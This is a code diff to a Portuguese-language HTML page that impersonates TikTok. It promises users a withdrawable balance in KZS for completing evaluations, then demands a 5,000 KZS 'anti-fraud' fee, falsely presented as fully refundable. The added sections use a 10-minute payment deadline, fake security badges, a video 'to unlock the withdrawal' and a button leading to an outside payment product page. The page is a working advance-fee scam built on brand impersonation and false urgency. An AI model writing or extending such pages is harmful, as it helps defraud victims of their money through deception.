@@ -112,9 +112,9 @@
             <p class="subtitle">Parabéns!</p>
             <p class="desc">Você completou todas as avaliações disponíveis para hoje.</p>
 
-            <div class="alert-box">
+            <div class="alert-box" style="background: rgba(0, 255, 0, 0.1); border-color: #00ff00; color: #00ff00;">
                 Saldo Total: <br>
-                <span id="balance-val-final" style="font-size: 1.5rem; color: black;">0,00</span> KZS
+                <span id="balance-val-final" style="font-size: 1.5rem; color: white;">0,00</span> KZS
             </div>
 
             <button class="btn-main" onclick="showWithdraw()">Realizar Saque</button>
@@ -139,7 +139,8 @@
             </div>
 
             <div class="input-box">
-                <label style="display:block; text-align:left; margin-bottom:5px; color:#888; font-size:0.9rem;">Chave /
+                <label style="display:block; text-align:left; margin-bottom:5px; color:#888; font-size:0.9rem;">Chave
+                    /
                     IBAN</label>
                 <input type="text" id="iban-input" placeholder="0000.0000.0000.0000">
             </div>
@@ -167,15 +168,131 @@
             </div>
 
             <div class="info-text">
-                Para liberar seu saque imediatamente, é necessário pagar uma pequena <strong>Taxa de Validação
+                Para liberar seu saque imediatamente, é necessário pagar uma pequena <strong>Taxa de
+                    Validação
                     Anti-Fraude</strong>.
                 <br><br>
                 Isso serve para confirmar que você é um humano real e não um robô. O valor será
                 <strong>reembolsado</strong> junto com seu saque.
             </div>
 
-            <button class="btn-main">Pagar Taxa e Liberar Saque</button>
-            <button class="btn-white">Ver Vídeo Explicativo</button>
+            <button class="btn-main" onclick="showInstructions()">Ativar Cadastro e Sacar</button>
+        </div>
+    </section>
+
+    <!-- SECTION 6: INSTRUCTIONS -->
+    <section id="instructions-section" class="hidden">
+        <div class="card" style="justify-content: flex-start; padding-top: 2rem;">
+            <!-- TikTok Logo -->
+            <div class="logo-area-small" style="margin-top: 1rem;">
+                <i class="fab fa-tiktok logo-icon-small"
+                    style="filter: drop-shadow(2px 2px 0 #ff0050) drop-shadow(-2px -2px 0 #00f2ea);"></i>
+            </div>
+
+            <h2 style="color: #ff0050; margin-bottom: 2rem; font-size: 1.4rem; line-height: 1.4;">
+                Ative seu Cadastro para<br>Receber o Dinheiro
+            </h2>
+
+            <!-- Step 1 -->
+            <div class="step-box">
+                <div class="step-badge">1º Passo</div>
+                <p>Para <span class="highlight-red">cadastrar seu IBAN ou número express</span>, é
+                    preciso fazer o pagamento da taxa <span class="highlight-red">ANTI-FRAUDE</span> no
+                    valor de 5.000 KZS.</p>
+                <p class="note">OBS: A taxa será <span class="highlight-red">100% devolvida</span> ao
+                    usuário junto ao seu 1º saque.</p>
+            </div>
+
+            <!-- Step 2 -->
+            <div class="step-box">
+                <div class="step-badge">2º Passo</div>
+                <p>Após o pagamento, você receberá imediatamente seu <span class="highlight-red">1º
+                        saque</span> e também receberá acesso ao App para <span class="highlight-red">continuar
+                        lucrando</span>.</p>
+            </div>
+
+            <!-- Action Button -->
+            <button class="btn-main" style="margin: 1.5rem 0;" onclick="showVSL()">Pagar Taxa e Receber
+                o Dinheiro</button>
+
+            <!-- Warning Box -->
+            <div class="warning-box">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>Após prosseguir, você terá <strong>10 minutos</strong> para concluir o pagamento e
+                    sacar.</p>
+                <p style="margin-top: 10px;">Se a taxa não for paga no prazo, <strong>seu saldo será
+                        100% devolvido ao App.</strong></p>
+            </div>
+
+            <!-- Footer Icons -->
+            <div class="secure-footer">
+                <i class="fas fa-shield-alt"></i>
+                <i class="fas fa-lock"></i>
+                <i class="fas fa-user-lock"></i>
+            </div>
+
+            <div class="legal-footer">
+                <p>Política de Privacidade | Termos de Uso | Direitos Autorais</p>
+                <p>© 2025 Tik Tok Brasil. Todos os direitos reservados.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- SECTION 7: VSL (Video Sales Letter) -->
+    <section id="vsl-section" class="hidden">
+        <div class="vsl-container-clean">
+            <!-- Balance Badge -->
+            <div class="vsl-balance-clean">
+                <div class="balance-label">Saldo Disponível</div>
+                <div class="balance-amount">
+                    <span id="vsl-balance-val">0,00</span> KZS
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="vsl-content">
+                <!-- TikTok Logo -->
+                <div class="vsl-logo">
+                    <i class="fab fa-tiktok"></i>
+                    <span class="christmas-hat">🎅</span>
+                </div>
+
+                <!-- Headline -->
+                <h1 class="vsl-headline-clean">
+                    Assista até o fim para<br>
+                    <span class="highlight-text">liberar o teu saque</span>
+                </h1>
+
+                <!-- Video Player -->
+                <div class="vsl-video-clean">
+                    <vturb-smartplayer id="vid-692a33c5d69941550922214a"
+                        style="display: block; margin: 0 auto; width: 100%;"></vturb-smartplayer>
+                    <script type="text/javascript">
+                        var s = document.createElement("script");
+                        s.src = "https://scripts.converteai.net/a32201f5-5e84-4186-86c3-fbc80b0de481/players/692a33c5d69941550922214a/v4/player.js",
+                            s.async = !0, document.head.appendChild(s);
+                    </script>
+                </div>
+
+                <!-- CTA Button -->
+                <button class="btn-vsl-clean"
+                    onclick="window.location.href='https://kintu-digital-shop.onrender.com/product/6fe28900-6467-4cd3-be69-fb5cd297029f'">
+                    <span class="btn-icon">🎁</span>
+                    Continuar para Receber
+                </button>
+
+                <!-- Trust Badges -->
+                <div class="trust-badges">
+                    <span><i class="fas fa-shield-alt"></i> Seguro</span>
+                    <span><i class="fas fa-lock"></i> Protegido</span>
+                    <span><i class="fas fa-check-circle"></i> Verificado</span>
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <div class="vsl-footer-clean">
+                <p>© 2025 TikTok Natal • Todos os direitos reservados</p>
+            </div>
         </div>
     </section>
 
